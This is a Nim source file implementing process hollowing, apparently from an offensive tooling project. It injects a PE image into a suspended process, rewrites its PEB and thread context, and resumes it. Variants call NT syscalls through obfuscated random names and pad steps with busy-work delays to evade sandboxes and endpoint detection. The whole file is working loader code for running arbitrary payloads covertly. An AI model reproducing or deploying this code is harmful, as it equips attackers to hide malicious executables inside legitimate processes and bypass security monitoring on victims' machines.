import winim
import ptr_math
import strutils
include reloc

proc hollow123*(peStr: string, processInfoAddress: PPROCESS_INFORMATION, sleepBetweenSteps: int): bool =

    # Parse PE
    var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
    var peBytesPtr = addr peBytes[0]
    var peImageDosHeader = cast[ptr IMAGE_DOS_HEADER](peBytesPtr)
    var peImageNtHeaders = cast[ptr IMAGE_NT_HEADERS]((cast[ptr BYTE](peBytesPtr) + peImageDosHeader.e_lfanew))
    var peImageSectionsHeader = cast[ptr IMAGE_SECTION_HEADER](cast[size_t](peImageNtHeaders) + sizeof(IMAGE_NT_HEADERS))
    var peImageSizeOfHeaders = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfHeaders)
    var peImageSize = cast[size_t](peImageNtHeaders.OptionalHeader.SizeOfImage)
    var peImageImageBase = cast[PVOID](peImageNtHeaders.OptionalHeader.ImageBase)
    var peImageEntryPoint = cast[PVOID](peImageNtHeaders.OptionalHeader.AddressOfEntryPoint)
    
    # Extract process information
    let sponsorProcessHandle = processInfoAddress.hProcess
    let sponsorThreadHandle = processInfoAddress.hThread
    let sponsorPid = processInfoAddress.dwProcessId
    let sponsorTid = processInfoAddress.dwThreadId
    when not defined(release): echo "[i] Sponsor PID: " & $sponsorPid
    when not defined(release): echo "[i] Sponsor TID: " & $sponsorTid
    
    # Get remote PEB address
    when not defined(release): echo "[*] Retrieving PEB address" 
    var bi: PROCESS_BASIC_INFORMATION
    var ret: DWORD
    if NtQueryInformationProcess(
        sponsorProcessHandle,
        0,
        addr bi,
        cast[windef.ULONG](sizeof(bi)),
        addr ret
    ) != 0:
        when not defined(release): echo "[-] Could not query sponsor process"   
        onFail(sponsorProcessHandle)
    
    let sponsorPeb = bi.PebBaseAddress
    when not defined(release): echo "[i] Sponsor PEB address: 0x" & $cast[int](sponsorPeb).toHex

    when defined(hollow1):
        
        sleepUselessCalculations(sleepBetweenSteps)
        
        # Allocate memory in sponsor process (preferred address)
        when not defined(release): echo "[*] Allocating memory in sponsor process (preferred address)"    
        var newImageBaseAddress = VirtualAllocEx(
            sponsorProcessHandle,
            peImageImageBase,
            peImageSize,
            MEM_COMMIT or MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        )
        if newImageBaseAddress == NULL:
            when not defined(release): echo "[-] Could not allocate in sponsor process at preffered address - 0x" & $cast[int](peImageImageBase).toHex   

            # Allocate memory in sponsor process (any address)
            when not defined(release): echo "[*] Allocating memory in sponsor process (any address)"    
            newImageBaseAddress = VirtualAllocEx(
                sponsorProcessHandle,
                NULL,
                peImageSize,
                MEM_COMMIT or MEM_RESERVE,
                PAGE_EXECUTE_READWRITE
            )
            if newImageBaseAddress == NULL:
                when not defined(release): echo "[-] Could not allocate in sponsor process at any address"
                onFail(sponsorProcessHandle)
                
        when not defined(release): echo "[i] New image base address: 0x" & $cast[int](newImageBaseAddress).toHex 
        when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](newImageBaseAddress) + cast[int](peImageEntryPoint)).toHex 

        sleepUselessCalculations(sleepBetweenSteps)

        # Copy PE headers to sponsor process 
        when not defined(release): echo "[*] Copying PE headers to sponsor process"    
        if WriteProcessMemory(
            sponsorProcessHandle,
            newImageBaseAddress,
            peBytesPtr,
            peImageSizeOfHeaders,
            NULL
        ) != TRUE:
            when not defined(release): echo "[-] Could not write to sponsor process"
            onFail(sponsorProcessHandle)

        # Copy PE sections to sponsor process
        when not defined(release): echo "[*] Copying PE sections to sponsor process" 
        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections) - 1):
            if WriteProcessMemory(
                sponsorProcessHandle,
                newImageBaseAddress + peImageSectionsHeader[i].VirtualAddress,
                peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
                peImageSectionsHeader[i].SizeOfRawData,
                NULL
            ) != TRUE:
                when not defined(release): echo "[-] Could not write to sponsor process"
                onFail(sponsorProcessHandle)
        
        # Overwrite sponsor PEB with the new image base address 
        when not defined(release): echo "[*] Overwriting PEB with the new image base address"
        if WriteProcessMemory(
            sponsorProcessHandle,
            cast[LPVOID](cast[int](sponsorPeb) + 0x10),
            addr newImageBaseAddress,
            cast[size_t](sizeof(PVOID)),
            NULL
        ) != TRUE:
            when not defined(release): echo "[-] Could not write to sponsor process"
            onFail(sponsorProcessHandle)

        # If needed, apply relocations
        if newImageBaseAddress != peImageImageBase:
            when not defined(release): echo "[*] Applying relocations"
            if not applyRelocations(peBytesPtr, newImageBaseAddress, sponsorProcessHandle):
                when not defined(release): echo "[-] Could not apply relocations"
                onFail(sponsorProcessHandle)

        sleepUselessCalculations(sleepBetweenSteps)

        # Change sponsor thread Entrypoint
        var context: CONTEXT
        context.ContextFlags = CONTEXT_INTEGER
        if GetThreadContext(sponsorThreadHandle, addr context) == FALSE:
            when not defined(release): echo "[-] Could not read from sponsor process PEB"
            onFail(sponsorProcessHandle)
        var entryPoint = cast[DWORD64](newImageBaseAddress) + cast[DWORD64](peImageEntryPoint)
        when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
        context.Rcx = cast[DWORD64](entryPoint)
        if SetThreadContext(sponsorThreadHandle, addr context) == FALSE:
            when not defined(release): echo "[-] Could not write to sponsor process PEB"
            onFail(sponsorProcessHandle)
        
        sleepUselessCalculations(sleepBetweenSteps)

        # Resume remote thread 
        when not defined(release): echo "[*] Resuming remote thread"
        ResumeThread(sponsorThreadHandle)
    
    when defined(hollow2) or defined(hollow3):
        
        var res: NTSTATUS
        sleepUselessCalculations(sleepBetweenSteps)
        
        # Allocate memory in sponsor process (preferred address)
        when not defined(release): echo "[*] Allocating memory in sponsor process (preferred address)"   
        var newImageBaseAddress = peImageImageBase
        res = CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
            sponsorProcessHandle,
            addr newImageBaseAddress,
            0,
            addr peImageSize,
            MEM_COMMIT or MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        ) 
        if res != 0:
            when not defined(release): echo "[-] Could not allocate in sponsor process at preffered address - 0x" & $cast[int](peImageImageBase).toHex   
            
            # Allocate memory in sponsor process (any address)
            when not defined(release): echo "[*] Allocating memory in sponsor process (any address)"   
            newImageBaseAddress = NULL
            res = CbZGEMmsvlfsZxPo( # NtAllocateVirtualMemory
            sponsorProcessHandle,
            addr newImageBaseAddress,
            0,
            addr peImageSize,
            MEM_COMMIT or MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
            ) 
            if res != 0:
                when not defined(release): echo "[-] Could not allocate in sponsor process at any address"
                onFail(sponsorProcessHandle)
                
        when not defined(release): echo "[i] New image base address: 0x" & $cast[int](newImageBaseAddress).toHex 
        when not defined(release): echo "[i] New entrypoint: 0x" & $(cast[int](newImageBaseAddress) + cast[int](peImageEntryPoint)).toHex 

        sleepUselessCalculations(sleepBetweenSteps)

        # Copy PE headers to sponsor process 
        when not defined(release): echo "[*] Copying PE headers to sponsor process"    
        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
            sponsorProcessHandle,
            newImageBaseAddress,
            peBytesPtr,
            peImageSizeOfHeaders,
            NULL
        ) != 0:
            when not defined(release): echo "[-] Could not write to sponsor process"
            onFail(sponsorProcessHandle)

        # Copy PE sections to sponsor process
        when not defined(release): echo "[*] Copying PE sections to sponsor process"    
        for i in countUp(0, cast[int](peImageNtHeaders.FileHeader.NumberOfSections) - 1):
            if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
                sponsorProcessHandle,
                newImageBaseAddress + peImageSectionsHeader[i].VirtualAddress,
                peBytesPtr + peImageSectionsHeader[i].PointerToRawData,
                peImageSectionsHeader[i].SizeOfRawData,
                NULL
            ) != 0:
                when not defined(release): echo "[-] Could not write headers to sponsor process"
                onFail(sponsorProcessHandle)
        
        # Overwrite sponsor PEB with the new image base address 
        when not defined(release): echo "[*] Overwriting PEB with the new image base address"
        if nVcnEsSyWXtfrjav( # NtWriteVirtualMemory
            sponsorProcessHandle,
            cast[LPVOID](cast[int](sponsorPeb) + 0x10),
            addr newImageBaseAddress,
            cast[size_t](sizeof(PVOID)),
            NULL
        ) != 0:
            when not defined(release): echo "[-] Could not write sections to sponsor process"
            onFail(sponsorProcessHandle)

        # If needed, apply relocations
        if newImageBaseAddress != peImageImageBase:
            when not defined(release): echo "[*] Applying relocations"
            if not applyRelocations(peBytesPtr, newImageBaseAddress, sponsorProcessHandle):
                when not defined(release): echo "[-] Could not apply relocations"
                onFail(sponsorProcessHandle)

        sleepUselessCalculations(sleepBetweenSteps)

        # Change sponsor thread Entrypoint
        var context: CONTEXT
        context.ContextFlags = CONTEXT_INTEGER
        if VzpSdkMDEGHOzTpB( # NtGetContextThread
            sponsorThreadHandle, 
            addr context
        ) != 0:
            when not defined(release): echo "[-] Could not read from sponsor process PEB"
            onFail(sponsorProcessHandle)
        var entryPoint = cast[DWORD64](newImageBaseAddress) + cast[DWORD64](peImageEntryPoint)
        var wtf_dont_ever_remove_this_line_from_here = context.Rcx #[
        Here I've been experiencing the fucking wierdest BUG in the whole world of humanity
        Don't know why, but if you remove this line, it would not work and you will never understand why
        Wasted LOT of time here
        ]# 
        when not defined(release): echo "[i] Changing RCX register to point the new entrypoint: 0x" & $context.Rcx.toHex & " -> 0x" & $entryPoint.toHex
        context.Rcx = cast[DWORD64](entryPoint)
        if IGyhziwCULdezDSq( # NtSetContextThread
            sponsorThreadHandle, addr context
        ) != 0:
            when not defined(release): echo "[-] Could not write to sponsor process PEB"
            onFail(sponsorProcessHandle)
            
        sleepUselessCalculations(sleepBetweenSteps)
        
        # Resume remote thread 
        when not defined(release): echo "[*] Resuming remote thread"
        if mAcJDfMgbUNFgsxu( # NtResumeThread
            sponsorThreadHandle,
            NULL
        ) != 0:
            when not defined(release): echo "[-] Could not resume the thread"
            onFail(sponsorProcessHandle)
